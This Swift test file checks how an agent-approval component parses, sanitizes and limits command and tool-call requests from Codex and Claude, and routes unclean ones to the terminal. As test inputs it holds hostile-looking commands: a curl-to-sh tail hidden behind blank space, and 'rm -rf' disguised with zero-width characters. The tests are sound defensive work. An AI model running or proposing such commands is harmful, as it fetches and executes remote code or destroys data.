            ("mode missing", elicitationParams(mode: NSNull())),
            ("meta null", elicitationParams(meta: NSNull())),
            ("meta string", elicitationParams(meta: "mcp_tool_call")),
            ("kind missing", elicitationParams(metaOverrides: ["codex_approval_kind": nil])),
            ("kind other", elicitationParams(metaOverrides: ["codex_approval_kind": "other"])),
            ("schema property", elicitationParams(schema: oneProperty)),
            ("schema missing", elicitationParams(schema: nil)),
            ("schema array", elicitationParams(schema: [1])),
            ("server empty", elicitationParams(server: "")),
            ("server number", elicitationParams(server: 3)),
            ("server with __", elicitationParams(server: "a__b")),
            ("server with space", elicitationParams(server: "my server")),
            ("server with bidi", elicitationParams(server: "a\u{202E}b")),
            ("tool missing", elicitationParams(metaOverrides: ["tool_name": nil])),
            ("tool empty", elicitationParams(metaOverrides: ["tool_name": ""])),
            ("tool line break", elicitationParams(metaOverrides: ["tool_name": "a\nb"])),
            ("tool too long", elicitationParams(metaOverrides: ["tool_name": longTool])),
            ("params missing", elicitationParams(metaOverrides: ["tool_params": nil])),
            ("params null", elicitationParams(metaOverrides: ["tool_params": NSNull()])),
            ("params string", elicitationParams(metaOverrides: ["tool_params": "x"])),
            ("params array", elicitationParams(metaOverrides: ["tool_params": [1]])),
        ]
        for (name, params) in cases {
            let parsed = CanvasAgentRequest.parseCodex(method: elicitationMethod, params: params)
            let request = try #require(parsed.request, "\(name)")
            #expect(request.kind == .notice, "\(name)")
            #expect(request.terminalOnly && request.options.isEmpty, "\(name)")
            #expect(parsed.shape != nil, "\(name)")
        }
        // The empty request is a notice too.
        #expect(
            CanvasAgentRequest.parse(method: elicitationMethod, params: [:])?.kind == .notice)
    }

    @Test("A tool approval Rafu cannot show whole needs the terminal")
    func elicitationTerminalOnly() throws {
        let long = String(repeating: "x", count: 3_000)
        var cases: [(String, [String: Any])] = [
            ("over 2 KiB", elicitationParams(metaOverrides: ["tool_params": ["body": long]])),
            (
                "zero-width character",
                elicitationParams(metaOverrides: ["tool_params": ["a": "b\u{200B}c"]])
            ),
            ("unknown meta key", elicitationParams(metaOverrides: ["codex_new_key": true])),
        ]
        // Each key that changes what an approval means, whatever its value.
        for forcing in [
            "codex_sensitive_action", "codex_requires_user_input", "codex_strict_auto_review",
            "approvals_reviewer",
        ] {
            for value: Any in [true, false, "guardian"] {
                cases.append(
                    ("\(forcing)=\(value)", elicitationParams(metaOverrides: [forcing: value])))
            }
        }
        for (name, params) in cases {
            let request = try #require(
                CanvasAgentRequest.parse(method: elicitationMethod, params: params), "\(name)")
            #expect(request.kind == .toolCall, "\(name)")
            #expect(request.terminalOnly, "\(name)")
            #expect(request.options.isEmpty, "\(name)")
            for decision in [
                CanvasAgentRequestDecision.accept, .decline, .cancel, .acceptForSession,
                .acceptAndRemember(.session), .acceptAndRemember(.always),
            ] {
                #expect(request.result(for: decision, policy: .all) == nil, "\(name)")
            }
        }
    }

    @Test("Only an unknown meta key is recorded as a shape, and the shape holds no value")
    func elicitationShapeRecord() throws {
        var meta = Self.codexAppsMeta
        meta["codex_new_key"] = Self.secret
        let parsed = CanvasAgentRequest.parseCodex(
            method: elicitationMethod,
            params: elicitationParams(server: "codex_apps", meta: meta))
        let request = try #require(parsed.request)
        #expect(request.kind == .toolCall && request.terminalOnly)
        let shape = try #require(parsed.shape)
        #expect(shape.contains("codex_new_key:string"))
        #expect(shape.hasPrefix(elicitationMethod + " "))
        for value in [Self.secret, "test", "Google Calendar", "connector_google_calendar"] {
            #expect(!shape.contains(value), "\(value)")
        }
        // The argument keys are chosen by the tool, so they are not named.
        #expect(!shape.contains("summary"))
        // A key that forces the terminal is known, so it is not recorded.
        let forced = CanvasAgentRequest.parseCodex(
            method: elicitationMethod,
            params: elicitationParams(metaOverrides: ["codex_sensitive_action": true]))
        #expect(forced.request?.terminalOnly == true)
        #expect(forced.shape == nil)
        // A card Rafu can answer records nothing.
        let plain = CanvasAgentRequest.parseCodex(
            method: elicitationMethod, params: elicitationParams())
        #expect(plain.shape == nil)
    }

    @Test("The remember choices of a tool approval follow `persist` and stay off by policy")
    func elicitationPersistChoices() throws {
        let cases: [(String, Any?, [CanvasAgentRequest.PersistChoice.Kind])] = [
            ("absent", nil, []), ("session", "session", [.session]),
            ("always", "always", [.always]), ("both", ["session", "always"], [.session, .always]),
            ("reversed", ["always", "session"], [.session, .always]),
            ("unknown word", "forever", []), ("unknown in list", ["session", "x"], [.session]),
            ("number", 3, []), ("null", NSNull(), []),
        ]
        for (name, persist, kinds) in cases {
            let request = try #require(
                CanvasAgentRequest.parse(
                    method: elicitationMethod,
                    params: elicitationParams(metaOverrides: ["persist": persist])),
                "\(name)")
            #expect(!request.terminalOnly, "\(name)")
            #expect(request.persistChoices.map(\.kind) == kinds, "\(name)")
            // Off today: the same buttons as without `persist`.
            #expect(request.options.map(\.id) == ["accept", "decline", "cancel"], "\(name)")
            for kind in kinds {
                #expect(!request.permits(.acceptAndRemember(kind)), "\(name)")
                #expect(request.result(for: .acceptAndRemember(kind)) == nil, "\(name)")
            }
            #expect(!request.permits(.acceptForSession), "\(name)")
        }
        let both = try #require(
            CanvasAgentRequest.parse(method: elicitationMethod, params: elicitationParams()))
        #expect(
            both.persistChoices.map(\.line) == [
                "Allow getJiraIssue of atlassian for this Codex session",
                "Always allow getJiraIssue of atlassian in Codex",
            ])
        // A policy turns each kind on, and never as the first button.
        #expect(
            both.options(policy: .all).map(\.id) == [
                "accept", "acceptAndRemember.session", "acceptAndRemember.always", "decline",
                "cancel",
            ])
        let session = CanvasAgentRequest.PersistPolicy(allowsSession: true, allowsLasting: false)
        #expect(
            both.options(policy: session).map(\.id) == [
                "accept", "acceptAndRemember.session", "decline", "cancel",
            ])
        #expect(try roundTrip(both) == both)
    }

    @Test("A Codex tool approval answers with the exact elicitation results")
    func elicitationResults() throws {
        let request = try #require(
            CanvasAgentRequest.parse(method: elicitationMethod, params: elicitationParams()))
        #expect(
            jsonText(request.result(for: .accept)) == #"{"action":"accept","content":null}"#)
        #expect(jsonText(request.result(for: .decline)) == #"{"action":"decline"}"#)
        #expect(
            jsonText(request.result(for: .cancel))
                == #"{"_meta":{"codex_approval_cancellation_reason":"user"},"action":"cancel","content":null}"#
        )
        #expect(request.result(for: .acceptForSession) == nil)
        #expect(request.result(for: .answers([:])) == nil)
        // `persist` goes out only when the policy allows it.
        #expect(request.result(for: .acceptAndRemember(.session)) == nil)
        #expect(
            jsonText(request.result(for: .acceptAndRemember(.session), policy: .all))
                == #"{"_meta":{"persist":"session"},"action":"accept","content":null}"#)
        #expect(
            jsonText(request.result(for: .acceptAndRemember(.always), policy: .all))
                == #"{"_meta":{"persist":"always"},"action":"accept","content":null}"#)
        let session = CanvasAgentRequest.PersistPolicy(allowsSession: true, allowsLasting: false)
        #expect(request.result(for: .acceptAndRemember(.always), policy: session) == nil)
        #expect(request.result(for: .acceptAndRemember(.rule), policy: .all) == nil)
        // A kind the tool did not offer is refused.
        let sessionOnly = try #require(
            CanvasAgentRequest.parse(
                method: elicitationMethod,
                params: elicitationParams(metaOverrides: ["persist": "session"])))
        #expect(sessionOnly.result(for: .acceptAndRemember(.always), policy: .all) == nil)
        for decision in [CanvasAgentRequestDecision.accept, .decline] {
            #expect(request.result(for: decision)?["_meta"] == nil)
        }
    }

    // MARK: Sanitizer limits

    @Test("A long command is cut at a character boundary and needs the terminal")
    func longCommand() throws {
        let command = String(repeating: "é", count: 1_500)  // 3,000 bytes
        let request = try #require(
            CanvasAgentRequest.parse(method: commandMethod, params: ["command": command]))
        let kept = try #require(request.command)
        #expect(kept.utf8.count <= CanvasAgentRequest.Limits.commandBytes)
        #expect(kept.utf8.count == 2_048)
        #expect(command.hasPrefix(kept))
        #expect(request.terminalOnly)
        let exact = String(repeating: "a", count: 2_048)
        let fits = CanvasAgentRequest(kind: .command, command: exact)
        #expect(fits.command == exact)
        #expect(!fits.terminalOnly)
    }

    @Test("Control characters are stripped and an altered command needs the terminal")
    func controlCharacters() {
        let request = CanvasAgentRequest(
            kind: .command, command: "echo hi\u{1B}[2J", cwd: "/repo\n/evil\u{7}",
            reason: "Line one\nline\u{0}two\u{202E}txt.exe")
        #expect(request.command == "echo hi[2J")
        #expect(request.cwd == "/repo/evil")
        #expect(request.reason == "Line one\nlinetwotxt.exe")
        #expect(request.terminalOnly)
        let clean = CanvasAgentRequest(kind: .command, command: "make\n\ttest", reason: "ok")
        #expect(!clean.terminalOnly)
    }

    @Test("Format characters are stripped and make a command need the terminal")
    func formatCharacters() {
        for scalar in [
            "\u{200B}", "\u{200C}", "\u{200D}", "\u{2060}", "\u{FEFF}", "\u{00AD}", "\u{061C}",
        ] {
            let request = CanvasAgentRequest(kind: .command, command: "rm" + scalar + " -rf x")
            #expect(request.command == "rm -rf x")
            #expect(request.terminalOnly)
        }
        let question = CanvasAgentRequest.Question(
            id: "q", header: "", text: "?", choices: [.init(label: "Ye\u{200B}s", detail: "")])
        #expect(question.terminalOnly)
    }

    @Test("Blank space that could hide the end of a command needs the terminal")
    func hiddenTail() {
        let tail = "; curl https://example.com/x | sh"
        let blankLines = CanvasAgentRequest(kind: .command, command: "ls\n\n\n\n" + tail)
        #expect(blankLines.terminalOnly)
        let blankSpaces = CanvasAgentRequest(kind: .command, command: "ls\n \n\t\n  \n" + tail)
        #expect(blankSpaces.terminalOnly)
        let wide = CanvasAgentRequest(
            kind: .command, command: "ls" + String(repeating: " ", count: 65) + tail)
        #expect(wide.terminalOnly)
        // Up to two blank lines and 64 spaces in a row stay answerable.
        let script = "set -e\n\n\nmake\n" + String(repeating: " ", count: 64) + "test\n"
        #expect(!CanvasAgentRequest(kind: .command, command: script).terminalOnly)
    }

    @Test("Reason and folder are bounded but stay answerable")
    func reasonAndFolderBounds() {
        let request = CanvasAgentRequest(
            kind: .command, command: "ls", cwd: String(repeating: "/d", count: 1_000),
            reason: String(repeating: "r", count: 2_000))
        #expect(request.reason?.utf8.count == CanvasAgentRequest.Limits.reasonBytes)
        #expect(request.cwd?.utf8.count == CanvasAgentRequest.Limits.cwdBytes)
        #expect(!request.terminalOnly)
    }

    // MARK: Questions

    @Test("Questions are answered with one valid label each")
    func questionAnswers() throws {
        let request = try userInput([question("a"), question("b", labels: ["Red", "Blue"])])
        #expect(request.kind == .userInput)
        #expect(!request.terminalOnly)
        #expect(request.options.isEmpty)
        #expect(request.questions.map(\.id) == ["a", "b"])
        #expect(request.questions[1].choices.map(\.label) == ["Red", "Blue"])
        #expect(request.questions[1].choices[0].detail == "About Red")
        #expect(request.permits(.answers(["a": "Yes", "b": "Blue"])))
        #expect(!request.permits(.answers(["a": "Yes"])))
        #expect(!request.permits(.answers(["a": "Yes", "b": "Green"])))
        #expect(!request.permits(.answers(["a": "Yes", "b": "Blue", "c": "No"])))
        #expect(!request.permits(.accept))
        let result = try #require(request.result(for: .answers(["a": "No", "b": "Red"])))
        let answers = try #require(result["answers"] as? [String: [String: [String]]])
        #expect(answers == ["a": ["answers": ["No"]], "b": ["answers": ["Red"]]])
    }

    @Test("Questions over the bounds keep four by six and need the terminal")
    func questionBounds() throws {
        let many = try userInput((0..<5).map { question("q\($0)") })
        #expect(many.questions.count == CanvasAgentRequest.Limits.questions)
        #expect(many.terminalOnly)
        let wide = try userInput([question("q", labels: (0..<7).map { "Option \($0)" })])
        #expect(wide.questions[0].choices.count == CanvasAgentRequest.Limits.choices)
        #expect(wide.questions[0].terminalOnly)
        #expect(wide.terminalOnly)
        #expect(!wide.permits(.answers(["q": "Option 0"])))
    }

    @Test("Secret and unclean questions need the terminal")
    func terminalOnlyQuestions() throws {
        #expect(try userInput([question("s", isSecret: true)]).terminalOnly)
        // Codex marks every model question isOther; its choices stay answerable.
        #expect(try !userInput([question("o", isOther: true)]).terminalOnly)
        #expect(try userInput([question("n", labels: [])]).terminalOnly)
        #expect(try userInput([question("l", labels: ["Yes\u{1B}", "No"])]).terminalOnly)
        #expect(try userInput([question("d"), question("d")]).terminalOnly)
        #expect(try userInput([]).terminalOnly)
        #expect(try userInput([["id": "x"]]).terminalOnly)
        // One terminal-only question makes the whole request terminal-only:
        // the answer must cover every question.
        let mixed = try userInput([question("a"), question("b", isSecret: true)])
        #expect(mixed.terminalOnly)
        #expect(!mixed.questions[0].terminalOnly)
    }

    // MARK: Codable

    @Test("Requests, decisions and answers survive a JSON round trip")
    func codableRoundTrip() throws {
        let date = Date(timeIntervalSinceReferenceDate: 812_345_678.25)
        let requests = [
            CanvasAgentRequest(
                kind: .command, isHumanCheckpoint: true, command: "ls\n", cwd: "/r",
                reason: "why", receivedAt: date),
            CanvasAgentRequest(kind: .fileChange, reason: "x", grantRoot: "/g", receivedAt: date),
            CanvasAgentRequest(
                kind: .permissions, permissions: ["Network access"], receivedAt: date),
            try userInput([question("a"), question("b", isSecret: true)]),
            CanvasAgentRequest(
                kind: .command, command: String(repeating: "x", count: 3_000), receivedAt: date),
        ]
        for request in requests { #expect(try roundTrip(request) == request) }
        let decisions: [CanvasAgentRequestDecision] = [
            .accept, .acceptForSession, .decline, .cancel, .answers(["a": "Yes"]),
        ]
        for decision in decisions { #expect(try roundTrip(decision) == decision) }
        let answer = CanvasAgentRequestAnswer(key: UUID(), decision: .answers(["q": "Red"]))
        #expect(try roundTrip(answer) == answer)
    }

    @Test("A request that cannot grant a session drops that option and survives a round trip")
    func sessionAllowFlag() throws {
        do {
            let codex = CanvasAgentRequest(kind: .command, command: "ls")
            let claude = CanvasAgentRequest(
                kind: .command, command: "ls", offersSessionAllow: false)
            #expect(codex.offersSessionAllow)
            #expect(codex.permits(.acceptForSession))
            #expect(!claude.offersSessionAllow)
            #expect(!claude.permits(.acceptForSession))
            #expect(claude.options.map(\.decision) == [.accept, .decline, .cancel])
            #expect(try roundTrip(claude) == claude)
            #expect(try roundTrip(claude).offersSessionAllow == false)
        }
        // An older peer sends no key: the Codex answers all stay available.
        let request = CanvasAgentRequest(kind: .command, command: "ls")
        var object = try #require(
            JSONSerialization.jsonObject(with: JSONEncoder().encode(request)) as? [String: Any])
        object["offersSessionAllow"] = nil
        let legacy = try JSONDecoder().decode(
            CanvasAgentRequest.self, from: JSONSerialization.data(withJSONObject: object))
        #expect(legacy == request)
    }

    @Test("The wire form carries the opaque key and no JSON-RPC id")
    func wireShape() throws {
        let request = try #require(
            CanvasAgentRequest.parse(
                method: commandMethod, params: ["command": "ls", "itemId": "item-1"]))
        let object = try #require(
            JSONSerialization.jsonObject(with: JSONEncoder().encode(request)) as? [String: Any])
        #expect(object["key"] as? String == request.key.uuidString)
        #expect(object["id"] == nil)
        #expect(object["itemId"] == nil)
    }

    @Test("Decoding rejects a value the sanitizer would change")
    func decodingRejectsUncleanValues() throws {
        let valid = CanvasAgentRequest(kind: .command, command: "ls", reason: "ok")
        let base = try #require(
            JSONSerialization.jsonObject(with: JSONEncoder().encode(valid)) as? [String: Any])
        func decodes(_ change: (inout [String: Any]) -> Void) throws -> Bool {
            var object = base
            change(&object)
            let data = try JSONSerialization.data(withJSONObject: object)
            return (try? JSONDecoder().decode(CanvasAgentRequest.self, from: data)) != nil
        }
        #expect(try decodes { _ in })
        #expect(try !decodes { $0["reason"] = "bad\u{1B}" })
        #expect(try !decodes { $0["reason"] = String(repeating: "r", count: 600) })
        #expect(try !decodes { $0["command"] = String(repeating: "c", count: 3_000) })
        #expect(try !decodes { $0["command"] = "rm\u{0}" })
        // A command that needs the terminal cannot arrive marked answerable.
        #expect(try !decodes { $0["command"] = "" })
        #expect(
            try !decodes {
                $0["isHumanCheckpoint"] = true
                $0["kind"] = "fileChange"
            })
        // A command carries the facts the row shows beside it (a network
        // target); no other kind than a permissions request carries them.
        #expect(try decodes { $0["permissions"] = ["Network: https example.com"] })
        #expect(try !decodes { $0["permissions"] = ["Network access\u{202E}"] })
        #expect(
            try !decodes {
                $0["permissions"] = ["Network access"]
                $0["kind"] = "toolCall"
                $0["reason"] = "A: b\nmcp__a__b"
            })
        // A file change cannot arrive marked answerable.
        #expect(
            try !decodes {
                $0["kind"] = "fileChange"
                $0["command"] = nil
            })
        #expect(try !decodes { $0["command"] = "ls\n\n\n\nrm -rf x" })
        #expect(
            try !decodes {
                $0["questions"] = [
                    ["id": "q", "header": "", "text": "?", "terminalOnly": false, "choices": []]
                ]
            })
        #expect(try !decodes { $0["kind"] = "elicitation" })
    }

    @Test("Decision decoding rejects unknown verdicts and too many answers")
    func decisionDecoding() {
        let unknown = Data(#"{"type":"acceptWithExecpolicyAmendment"}"#.utf8)
        #expect((try? JSONDecoder().decode(CanvasAgentRequestDecision.self, from: unknown)) == nil)
        let many = Data(
            #"{"type":"answers","answers":{"a":"1","b":"1","c":"1","d":"1","e":"1"}}"#.utf8)
        #expect((try? JSONDecoder().decode(CanvasAgentRequestDecision.self, from: many)) == nil)
    }

    @Test("Bridge messages carry requests and stay compatible with older peers")
    func bridgeMessages() throws {
        let legacyRequest = Data(#"{"token":"t","clientID":"c","operation":"list"}"#.utf8)
        let decoded = try JSONDecoder().decode(CanvasBridgeRequest.self, from: legacyRequest)
        #expect(decoded.approval == nil)
        #expect(decoded.approvalKey == nil)
        let legacyResponse = Data(#"{"peers":[],"messages":[]}"#.utf8)
        #expect(
            try JSONDecoder().decode(CanvasBridgeResponse.self, from: legacyResponse)
                .approvalDecision == nil)
        let approval = CanvasAgentRequest(kind: .command, command: "ls")
        let open = CanvasBridgeRequest(
            token: "t", operation: CanvasAgentRequest.openOperation, provider: "codex",
            approval: approval)
        #expect(try roundTrip(open) == open)
        let close = CanvasBridgeRequest(
            token: "t", operation: CanvasAgentRequest.closeOperation, approvalKey: approval.key)
        #expect(try roundTrip(close) == close)
        let poll = CanvasBridgeResponse(
            approvalDecision: CanvasAgentRequestAnswer(key: approval.key, decision: .decline))
        #expect(try roundTrip(poll) == poll)
        // The largest request stays well inside one IPC frame.
        let largest = try userInput(
            (0..<4).map { index in
                question(
                    String(repeating: "i", count: 128) + "\(index)",
                    labels: (0..<6).map { String(repeating: "\($0)", count: 128) })
            })
        let full = CanvasBridgeRequest(
            token: "t", operation: CanvasAgentRequest.openOperation, approval: largest)
        #expect(try JSONEncoder().encode(full).count < LauncherIPCProtocol.maxFrameBytes / 2)
    }

    // MARK: Question sets

    private static func set(
        multiple: Bool = false, freeText: Bool = true, labels: [String] = ["A", "B", "C"]
    ) -> CanvasAgentRequest {
        CanvasAgentRequest(
            kind: .userInput,
            questions: [
                .init(
                    id: "q", header: "H", text: "Pick?",
                    choices: labels.map { .init(label: $0, detail: "") },
                    allowsMultiple: multiple, allowsFreeText: freeText)
            ])
    }

    @Test("A single-choice question takes exactly one label or a text")
    func singleChoiceAnswers() {
        let request = Self.set()
        #expect(request.permits(.answers(["q": "A"])))
        #expect(request.permits(.answers(["q": QuestionAnswer(text: "Mine")])))
        #expect(!request.permits(.answers(["q": QuestionAnswer(labels: ["A", "B"])])))
        #expect(!request.permits(.answers(["q": QuestionAnswer(labels: ["A"], text: "x")])))
        #expect(!request.permits(.answers(["q": QuestionAnswer()])))
        #expect(!request.permits(.answers(["q": "D"])))
        // Text must be allowed, fit, stay on one line, be clean and not blank.
        #expect(!Self.set(freeText: false).permits(.answers(["q": QuestionAnswer(text: "x")])))
        let long = String(repeating: "t", count: CanvasAgentRequest.Limits.freeTextBytes + 1)
        for text in [long, "a\nb", "a\u{202E}b", "   "] {
            #expect(!request.permits(.answers(["q": QuestionAnswer(text: text)])))
        }
        let fits = String(repeating: "t", count: CanvasAgentRequest.Limits.freeTextBytes)
        #expect(request.permits(.answers(["q": QuestionAnswer(text: fits)])))
    }

    @Test("A multiple-choice question takes labels, a text, or both, each label once")
    func multipleChoiceAnswers() {
        let request = Self.set(multiple: true)
        #expect(request.questions[0].allowsMultiple)
        #expect(request.permits(.answers(["q": QuestionAnswer(labels: ["A", "C"])])))
        #expect(request.permits(.answers(["q": QuestionAnswer(labels: ["B"], text: "and")])))
        #expect(request.permits(.answers(["q": QuestionAnswer(text: "only")])))
        #expect(!request.permits(.answers(["q": QuestionAnswer(labels: ["A", "A"])])))
        #expect(!request.permits(.answers(["q": QuestionAnswer()])))
        // A label with ", " makes a multiple-choice question terminal-only.
        let comma = Self.set(multiple: true, labels: ["a, b", "c"])
        #expect(comma.terminalOnly)
        #expect(!Self.set(labels: ["a, b", "c"]).terminalOnly)
        // Two choices with one label cannot be told apart.
        #expect(Self.set(labels: ["A", "A"]).terminalOnly)
    }

    @Test("A Codex answer sends labels, then the note; a lone note goes with the other label")
    func codexQuestionResult() throws {
        let request = try userInput([question("a", isOther: true), question("b", isOther: true)])
        #expect(request.questions.allSatisfy { $0.allowsFreeText })
        let result = try #require(
            request.result(
                for: .answers(["a": QuestionAnswer(text: "Mine"), "b": "Yes"])))
        let answers = try #require(result["answers"] as? [String: [String: [String]]])
        #expect(
            answers == [
                "a": ["answers": ["None of the above", "user_note: Mine"]],
                "b": ["answers": ["Yes"]],
            ])
        // No free text without `isOther`.
        let closed = try userInput([question("c")])
        #expect(!closed.permits(.answers(["c": QuestionAnswer(text: "x")])))
    }

    @Test("A question answer reads the older form and writes it when it can")
    func questionAnswerWire() throws {
        let old = #"{"type":"answers","answers":{"a":"Yes","b":"Blue"}}"#
        let decision = try JSONDecoder().decode(
            CanvasAgentRequestDecision.self, from: Data(old.utf8))
        #expect(decision == .answers(labels: ["a": "Yes", "b": "Blue"]))
        // One label and no text encodes as the plain label, so an older peer reads it.
        let plain = try JSONEncoder().encode(QuestionAnswer(labels: ["Yes"]))
        #expect(String(decoding: plain, as: UTF8.self) == #""Yes""#)
        let rich = QuestionAnswer(labels: ["A", "B"], text: "and")
        #expect(try roundTrip(rich) == rich)
        #expect(try roundTrip(QuestionAnswer(text: "t")) == QuestionAnswer(text: "t"))
        // Too many labels or too much text is refused at decode.
        let many = #"{"labels":["1","2","3","4","5","6","7"]}"#
        #expect((try? JSONDecoder().decode(QuestionAnswer.self, from: Data(many.utf8))) == nil)
        let text = String(repeating: "t", count: CanvasAgentRequest.Limits.freeTextBytes + 1)
        let big = #"{"text":"\#(text)"}"#
        #expect((try? JSONDecoder().decode(QuestionAnswer.self, from: Data(big.utf8))) == nil)
    }

    @Test("A preview is display only, bounded per choice and per request")
    func previews() throws {
        let preview = String(repeating: "p", count: CanvasAgentRequest.Limits.previewBytes + 5)
        let one = CanvasAgentRequest.Question(
            id: "q", header: "", text: "?",
            choices: [.init(label: "A", detail: "", preview: preview)])
        #expect(one.choices[0].preview?.utf8.count == CanvasAgentRequest.Limits.previewBytes)
        #expect(!one.terminalOnly)
        let full = String(repeating: "p", count: CanvasAgentRequest.Limits.previewBytes)
        let questions = (0..<4).map { index in
            CanvasAgentRequest.Question(
                id: "q\(index)", header: "", text: "Q\(index)?",
                choices: (0..<6).map { .init(label: "L\($0)", detail: "", preview: full) })
        }
        let request = CanvasAgentRequest(kind: .userInput, questions: questions)
        let total = request.questions.flatMap(\.choices).compactMap(\.preview)
            .reduce(0) { $0 + $1.utf8.count }
        #expect(total <= CanvasAgentRequest.Limits.previewBytesTotal)
        #expect(!request.terminalOnly)
        #expect(try roundTrip(request) == request)
        // Even the largest request with previews fits one IPC frame.
        let open = CanvasBridgeRequest(
            token: "t", operation: CanvasAgentRequest.openOperation, approval: request)
        #expect(try JSONEncoder().encode(open).count < LauncherIPCProtocol.maxFrameBytes / 2)
    }

    // MARK: Plans and notices

    @Test("A plan and a notice are shown, never answered, and cut text is marked")
    func planAndNotice() throws {
        let plan = CanvasAgentRequest(
            kind: .plan, reason: "/tmp/plan.md",
            text: String(repeating: "x", count: CanvasAgentRequest.Limits.planBytes + 1))
        #expect(plan.terminalOnly)
        #expect(plan.options.isEmpty)
        #expect(!plan.permits(.accept))
        #expect(plan.text?.utf8.count == CanvasAgentRequest.Limits.planBytes)
        #expect(plan.textIsCut)
        let notice = CanvasAgentRequest(
            kind: .notice, reason: "Network request", text: "Allow example.com?")
        #expect(notice.terminalOnly)
        #expect(notice.text == "Allow example.com?")
        #expect(!notice.textIsCut)
        let long = CanvasAgentRequest(
            kind: .notice, reason: "x",
            text: String(repeating: "n", count: CanvasAgentRequest.Limits.noticeBytes + 1))
        #expect(long.text?.utf8.count == CanvasAgentRequest.Limits.noticeBytes)
        #expect(long.textIsCut)
        for request in [plan, notice, long] { #expect(try roundTrip(request) == request) }
        // Only a plan or a notice carries text.
        let command = CanvasAgentRequest(kind: .command, command: "ls", text: "hidden")
        #expect(command.text == nil)
        #expect(!command.textIsCut)
    }

    @Test("A request from an older peer decodes with the new fields at their defaults")
    func olderPeerRequest() throws {
        let request = CanvasAgentRequest(kind: .command, command: "ls")
        var object = try #require(
            try JSONSerialization.jsonObject(with: JSONEncoder().encode(request))
                as? [String: Any])
        for key in ["text", "textIsCut", "persistChoices", "stopsTurnOnCancel"] {
            object.removeValue(forKey: key)
        }
        let decoded = try JSONDecoder().decode(
            CanvasAgentRequest.self, from: JSONSerialization.data(withJSONObject: object))
        #expect(decoded == request)
        #expect(decoded.stopsTurnOnCancel)
        #expect(decoded.persistChoices.isEmpty)
    }

    // MARK: Remember choices

    private static let remembering = CanvasAgentRequest(
        kind: .toolCall, command: "{}",
        reason: "codex_apps: create_event\nmcp__codex_apps__create_event",
        persistChoices: [
            .init(kind: .session, line: "Allow for this session"),
            .init(kind: .always, line: "Always allow create_event for Codex"),
            .init(kind: .session, line: "A second session choice is dropped"),
        ],
        stopsTurnOnCancel: false, offersSessionAllow: false)

    @Test("Remember choices are off by default; the policy turns each kind on")
    func rememberChoicesOffByDefault() {
        let request = Self.remembering
        #expect(request.persistChoices.map(\.kind) == [.session, .always])
        #expect(CanvasAgentRequest.PersistPolicy.current.allowsSession == false)
        #expect(CanvasAgentRequest.PersistPolicy.current.allowsLasting == false)
        #expect(request.options.map(\.label) == ["Allow", "Deny", "Cancel tool call"])
        #expect(!request.permits(.acceptAndRemember(.session)))
        #expect(!request.permits(.acceptAndRemember(.always)))
        #expect(request.result(for: .acceptAndRemember(.session)) == nil)
        let session = CanvasAgentRequest.PersistPolicy(allowsSession: true, allowsLasting: false)
        #expect(
            request.options(policy: session).map(\.label) == [
                "Allow", "Allow for this session", "Deny", "Cancel tool call",
            ])
        #expect(request.permits(.acceptAndRemember(.session), policy: session))
        #expect(!request.permits(.acceptAndRemember(.always), policy: session))
        let all = request.options(policy: .all)
        // Never the first option, every id unique.
        #expect(all.first?.decision == .accept)
        #expect(Set(all.map(\.id)).count == all.count)
        #expect(all.map(\.label).contains("Always allow create_event for Codex"))
    }

    @Test("Remember choices hold only whole, clean lines, and only on commands and tool calls")
    func rememberChoiceSanitizing() throws {
        let unclean = CanvasAgentRequest(
            kind: .command, command: "ls",
            persistChoices: [
                .init(kind: .rule, line: "Add rule\u{202E} x"),
                .init(kind: .always, line: String(repeating: "l", count: 600)),
                .init(kind: .session, line: ""),
            ])
        #expect(unclean.persistChoices.isEmpty)
        let checkpoint = CanvasAgentRequest(
            kind: .command, isHumanCheckpoint: true, command: "ls",
            persistChoices: [.init(kind: .rule, line: "Rule")])
        #expect(checkpoint.persistChoices.isEmpty)
        let file = CanvasAgentRequest(
            kind: .fileChange, persistChoices: [.init(kind: .rule, line: "Rule")])
        #expect(file.persistChoices.isEmpty)
        #expect(try roundTrip(Self.remembering) == Self.remembering)
        // The command order keeps the remember choice after the accept options.
        let command = CanvasAgentRequest(
            kind: .command, command: "npm test",
            persistChoices: [.init(kind: .rule, line: "Add rule Bash(npm test) to local settings")])
        #expect(
            command.options(policy: .all).map(\.decision) == [
                .accept, .acceptForSession, .acceptAndRemember(.rule), .decline, .cancel,
            ])
        #expect(command.options.map(\.label).last == "Deny and stop")
    }

    @Test("A remember decision survives a round trip and an unknown kind is refused")
    func rememberDecisionWire() throws {
        for kind in CanvasAgentRequest.PersistChoice.Kind.allCases {
            #expect(
                try roundTrip(CanvasAgentRequestDecision.acceptAndRemember(kind))
                    == .acceptAndRemember(kind))
        }
        let bad = #"{"type":"acceptAndRemember","persist":"forever"}"#
        #expect(
            (try? JSONDecoder().decode(CanvasAgentRequestDecision.self, from: Data(bad.utf8)))
                == nil)
        #expect(
            CanvasAgentRequestDecision.acceptAndRemember(.rule).identifier
                == "acceptAndRemember.rule")
    }

    // MARK: Codex classes

    @Test("Codex methods classify by name; an unknown one is unclassified")
    func codexClasses() {
        #expect(CanvasAgentRequest.classify(method: commandMethod) == .command)
        #expect(CanvasAgentRequest.classify(method: elicitationMethod) == .elicitation)
        #expect(CanvasAgentRequest.classify(method: "execCommandApproval") == .legacyApproval)
        #expect(CanvasAgentRequest.classify(method: "item/tool/call") == .notUserPrompt)
        #expect(CanvasAgentRequest.classify(method: "item/new/thing") == .unclassified)
    }
}
